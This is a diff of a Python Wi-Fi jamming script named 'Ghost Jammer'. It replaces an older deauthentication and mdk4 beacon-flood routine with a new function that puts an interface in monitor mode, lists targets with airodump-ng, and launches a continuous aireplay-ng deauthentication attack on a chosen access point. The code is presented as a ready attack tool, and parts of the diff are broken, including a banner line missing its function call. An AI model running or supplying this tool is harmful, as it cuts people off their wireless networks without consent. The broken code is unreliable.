@@ -22,6 +22,11 @@ AUDIO_FILES = {
     "exit": "exit.mp3"
 }
 
+# Check for missing audio files
+for key, file in AUDIO_FILES.items():
+    if not os.path.exists(os.path.join(os.path.dirname(__file__), file)):
+        console.print(f"[bold yellow]⚠️ Missing audio file: {file} (Place it in the script's directory)[/bold yellow]")
+
 # Detect Platform
 def detect_platform():
     if "termux" in os.environ.get('PREFIX', '').lower():
@@ -38,20 +43,32 @@ def detect_platform():
 PLATFORM = detect_platform()
 
 # Set Interface
-if PLATFORM == "termux":
-    INTERFACE = "wlan0"  # Termux में WiFi इंटरफेस
-else:
-    INTERFACE = "wlan0"  # डिफ़ॉल्ट
+INTERFACE = "wlan0"  # Default (Termux uses the same)
 
 # =====================
-# Audio Playback System
+# Audio Playback System (Fixed)
 # =====================
 def play_voice(filename):
-    path = os.path.join(os.path.dirname(__file__), AUDIO_FILES[filename])
-    if PLATFORM == "termux":
-        os.system(f'termux-media-player play "{path}" > /dev/null 2>&1')
-    else:
-        os.system(f'mpg123 "{path}" > /dev/null 2>&1')
+    try:
+        path = os.path.join(os.path.dirname(__file__), AUDIO_FILES[filename])
+        if not os.path.exists(path):
+            console.print(f"[bold red]⚠️ Audio file '{AUDIO_FILES[filename]}' not found![/bold red]")
+            return
+
+        if PLATFORM == "termux":
+            if os.system("which termux-media-player >/dev/null 2>&1") == 0:
+                os.system(f'termux-media-player play "{path}" >/dev/null 2>&1')
+            else:
+                console.print("[bold yellow]⚠️ 'termux-media-player' not installed. Install with:[/bold yellow]\n[bold cyan]pkg install termux-api[/bold cyan]")
+        else:
+            if os.system("which mpg123 >/dev/null 2>&1") == 0:
+                os.system(f'mpg123 "{path}" >/dev/null 2>&1')
+            elif os.system("which aplay >/dev/null 2>&1") == 0:
+                os.system(f'aplay "{path}" >/dev/null 2>&1')
+            else:
+                console.print("[bold yellow]⚠️ Install 'mpg123' or 'aplay' for audio.[/bold yellow]")
+    except Exception as e:
+        console.print(f"[bold red]❌ Audio Error: {str(e)}[/bold red]")
 
 # =====================
 # Animation Loader
@@ -121,124 +138,68 @@ def print_scary_banner():
     skull.append("⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⡿⠻⢷⣮⣉⣭⣡⣟⡱⠀⠀⡀⢀⡞⢀⢠⡀⠹⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣟⠋⠀⠀⠀⡠⡡⣹⣿⣿⣿⠿⠡⢀⣀⠀⠾⠁⠀⠀⠀⠀\n", style="bold yellow")
     skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠽⢿⢿⣻⡿⠈⢀⣶⣿⣿⣿⣿⡽⠃⢀⡴⣰⣿⢤⣓⢿⣿⣄⠙⣻⣷⡟⣿⣿⣿⣽⡻⣿⠿⠧⡶⣒⢭⣺⣽⣿⠟⢍⢀⠀⡉⠑⢶⣯⡲⣄⠀⠀⠀⠀\n", style="bold yellow")
     skull.append("⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⣟⣷⣞⡟⠉⣴⡿⣯⣷⣿⣿⡟⡡⢀⣜⣼⣿⣿⣎⢳⢿⢻⣿⡄⠑⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣾⣿⣿⢃⣠⣤⢖⡾⢷⡲⣆⡳⣿⣮⢢⡄⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⡔⣩⢦⣐⣈⣦⣄⡠⢗⣿⣾⢁⣼⢏⣿⣿⣿⣿⡟⠐⣠⢝⣾⣿⣿⣿⣯⡟⣷⣿⣻⣿⣄⢈⢆⠻⢿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡧⢨⣲⣷⣿⠋⣟⣶⣀⣳⡖⣿⣇⣃⠀⠀\n", style="bold yellow")
-    skull.append("⠀⣘⡸⣞⣿⣿⣿⣿⣿⣿⣿⡿⠁⣺⣣⣿⣿⣿⣿⠎⢀⢢⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣢⢀⠡⡘⢪⡯⡻⣿⣿⣿⣿⣿⣿⣻⣟⢧⣽⣿⣿⠀⠀⣎⣱⡏⣏⣿⣯⡽⠀⠀\n", style="bold yellow")
-    skull.append("⠀⣿⣧⣼⣿⡟⠛⠛⠿⢟⠟⣁⣼⣿⣿⠛⢉⡜⠁⡠⣠⣷⢿⣿⡿⣿⣿⣿⣿⠟⠉⠙⠛⢯⣽⣯⠷⣄⠑⠜⠑⡷⡜⢿⠿⠟⠛⠉⠀⢸⢺⣾⣿⣿⣷⣄⣀⠏⣱⣿⣿⣿⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⢹⣿⣾⣿⣿⣤⡤⠔⢑⣡⣾⡿⡿⠁⡠⠋⠀⡀⢀⣿⡟⣿⣿⣿⡙⣿⣻⣿⡄⠀⠀⠀⠀⠉⠻⣿⣟⣧⡄⠀⠘⣟⢦⡱⣄⠀⠀⠀⢸⣼⣿⢿⣿⣿⣷⣤⣾⣿⣿⣿⠏⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠹⢿⣿⠏⣰⣧⣾⣿⣿⠟⠋⠀⡰⠡⡡⠀⣠⣿⣿⣿⣿⣿⣿⣗⢸⣿⣿⣷⠀⠀⠀⠀⠀⠀⠱⡹⣟⣿⣦⡁⠈⠳⢕⢄⠑⠂⠐⢾⣿⣿⣿⣿⣿⠛⠿⠟⠛⠋⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠀⠀⣯⣼⣿⣿⠋⠁⠀⠀⠀⠀⡇⠐⠀⢠⣿⣿⡝⣿⠃⠈⢻⡞⢸⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠉⢻⣷⣾⣿⣦⡄⠀⠀⠈⠐⢺⣽⣿⣿⡎⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠀⠀⣿⣻⡟⠁⠀⠀⠀⠀⠀⢸⡇⠀⢀⣿⣿⣿⣿⠏⠀⠀⢸⠳⣜⣹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⢿⣿⣿⣷⣶⣶⣶⣿⣿⢟⣻⣿⢟⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠀⠀⠸⣿⣿⡦⠀⠀⠀⠀⠀⠘⡇⠰⣼⡿⡿⣾⡏⠀⠀⠀⢸⠣⣹⣾⣿⡹⠀⡠⢄⣂⢤⠀⠀⠀⠀⠀⠈⠉⠻⣟⢿⣾⣚⣿⣿⣿⣿⣽⡏⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠀⢠⣾⢛⣿⡟⠀⠀⠀⠀⠀⠀⢷⣀⢻⣷⣟⣻⡇⠀⠀⢀⢯⣅⣿⣷⣿⠇⣜⣾⣿⣿⣿⣧⣀⠀⠀⠀⠀⠀⠀⠈⠉⠸⠿⣿⠏⠘⠔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠈⢻⡯⢿⣿⡿⡴⣀⡠⣪⡷⣽⣿⣿⡿⢚⣿⣿⡟⠀⠙⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⡈⠛⠿⠽⢞⢋⠜⠻⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠛⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
-    skull.append("\n[☠️  GHOST JAMMER READY  ☠️]\n", style="bold white on red")
-    console.print(skull)
-    time.sleep(5)
+    skull.append("⠀⠀⡔⣩⢦⣐⣈⣦⣄⡠⢗⣿⣾⢁⣼⢏⣿⣿⣿⣿⡟⠐⣠⢝⣾⣿⣿⣿⣯⡟⣷⣿⣻⣿⣿⣟⣿⢸⣿⣿⣿⢻⣿⣿⣿⣦⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
+⠀⠀⠀⠠⣿⣿⣿⠀⠈⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
 
-# =====================
-# Exit Panel
-# =====================
-def banner_exit():
-    panel = Panel.fit(Text("💀 THANK YOU FOR USING GHOST JAMMER 💀", justify="center", style="bold white on red"),
-                      title="Exiting...", border_style="bright_magenta")
+    panel = Panel.fit(skull, title="🔪 WARNING: MALICIOUS ACTIVITY DETECTED  🔪", subtitle="Running as ROOT", border_style="red", padding=1)
     console.print(panel)
+    play_voice("intro")  # Play eerie intro sound
 
 # =====================
 # Login System
 # =====================
-def login():
+def authenticate():
+    clear_screen()
     banner_main()
-    console.print(Panel("🔐 [bold red]Login Required[/bold red]", style="bold green", border_style="cyan"))
-    username = console.input("[bold yellow]> Username:[/bold yellow] ")
-    password = getpass("🔐 Password: ")
-
-    if username == USERNAME and password == PASSWORD:
-        play_voice("intro")
-        return True
-    else:
-        console.print("[bold red]❌ Invalid credentials![/bold red]")
-        return False
-
-# =====================
-# Network Setup (Platform-Specific)
-# =====================
-def enable_monitor_mode():
-    if PLATFORM == "termux":
-        console.print("[bold yellow]⚠️ Termux requires manual steps for Monitor Mode![/bold yellow]")
-        console.print("[bold cyan]1. Run 'termux-wifi-enable'[/bold cyan]")
-        console.print("[bold cyan]2. Use 'iwconfig' to check interface.[/bold cyan]")
-    else:
-        os.system(f"sudo ifconfig {INTERFACE} down")
-        os.system(f"sudo iwconfig {INTERFACE} mode monitor")
-        os.system(f"sudo ifconfig {INTERFACE} up")
-        console.print(f"[+] {INTERFACE} is now in monitor mode")
-
-def scan_networks():
-    console.print("[*] Scanning for Wi-Fi networks... (CTRL+C to stop)")
-    time.sleep(2)
-    if PLATFORM == "termux":
-        os.system(f"iwlist {INTERFACE} scan")
-    else:
-        os.system(f"sudo airodump-ng {INTERFACE}")
-
-def restore_interface():
-    console.print("[*] Restoring interface...")
-    if PLATFORM != "termux":
-        os.system(f"sudo ifconfig {INTERFACE} down")
-        os.system(f"sudo iwconfig {INTERFACE} mode managed")
-        os.system(f"sudo ifconfig {INTERFACE} up")
-        console.print(f"[+] {INTERFACE} is back to managed mode.")
-
-# =====================
-# Jamming (Deauth + Beacon)
-# =====================
-def start_jamming(bssid, channel):
-    console.print(f"[+] Target BSSID: {bssid} on Channel: {channel}")
-    console.print("[*] Setting channel...")
-    if PLATFORM != "termux":
-        os.system(f"sudo iwconfig {INTERFACE} channel {channel}")
-    
-    console.print("[*] Starting Deauth + Beacon Flood attack... (Press CTRL+C to stop)")
-    time.sleep(1)
-
-    try:
-        if PLATFORM == "termux":
-            console.print("[bold red]❌ Termux does not support Deauth attacks![/bold red]")
-        else:
-            deauth_proc = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, INTERFACE])
-            mdk4_proc = subprocess.Popen(["sudo", "mdk4", INTERFACE, "b", "-c", channel, "-t", bssid])
-            deauth_proc.wait()
-            mdk4_proc.wait()
-
-    except KeyboardInterrupt:
-        console.print("\n[!] CTRL+C pressed. Stopping attacks...")
-        if PLATFORM != "termux":
-            deauth_proc.terminate()
-            mdk4_proc.terminate()
-        restore_interface()
-        banner_exit()
-        play_voice("exit")
-
-# =====================
-# Main Function
-# =====================
-def main():
-    if login():
+    max_attempts = 3
+    for attempt in range(max_attempts):
+        entered_user = input("\n[bold cyan][?][/] Username: ")
+        entered_pass = getpass("[bold red][?][/] Password: ")
+        if entered_user == USERNAME and entered_pass == PASSWORD:
+            return True
+        console.print(f"\n[bold red]⚠️ Invalid credentials ({attempt + 1}/{max_attempts})[/bold red]")
+        time.sleep(2)
         clear_screen()
-        print_scary_banner()
-        enable_monitor_mode()
-        scan_networks()
+    return False
 
-        bssid = console.input("\n[+] Enter Target BSSID (MAC Address): ")
-        channel = console.input("[+] Enter Target Channel: ")
-        start_jamming(bssid, channel)
-
-if __name__ == "__main__":
+# =====================
+# Main Jammer Function
+# =====================
+def jam_wifi():
     try:
-        main()
+        print_scary_banner()
+        wait_anim("Scanning networks...", 5)
+
+        # Put interface in monitor mode
+        subprocess.run(["airmon-ng", "start", INTERFACE], check=True)
+        mon_interface = f"{INTERFACE}mon"  # e.g., wlan0mon
+
+        # Run airodump-ng to list targets (replace with your target selection logic)
+        console.print("\n[bold green]🔍 Targets detected:[/bold green]")
+        subprocess.run(["airodump-ng", mon_interface], check=True)
+
+        # Replace with actual target BSSID/channel (example)
+        BSSID = input("\n[bold cyan]🎯 Target BSSID: [/bold cyan]")
+        CHANNEL = input("[bold cyan]📡 Channel: [/bold cyan]")
+
+        # Start deauth attack
+        with console.status("[bold red]💀 Jamming... (Ctrl+C to stop)[/bold red]") as status:
+            subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", BSSID, mon_interface])
+            time.sleep(10)  # Adjust duration as needed
+
     except KeyboardInterrupt:
-        restore_interface()
-        banner_exit()
-        play_voice("exit")
+        console.print("\n[bold yellow]🛑 Stopping jammer...[/bold yellow]")
+    except Exception as e:
+        console.print(f"[bold red]❌ ERROR: {e}[/bold red]")
+    finally:
+        # Cleanup monitor mode
+        subprocess.run(["airmon-ng", "stop", mon_interface], timeout=10)
+        play_voice("exit")  # Play exit sting
+        console.print("\n[bold green]✅ Jammer terminated safely.[/bold green]")
+
+# =====================RUN=====================
+if __name__ == "__main__":
+    if authenticate():
+        jam_wifi()
+    else:
+        console.print("[bold red]🚫 Maximum login attempts exceeded![/bold red]")
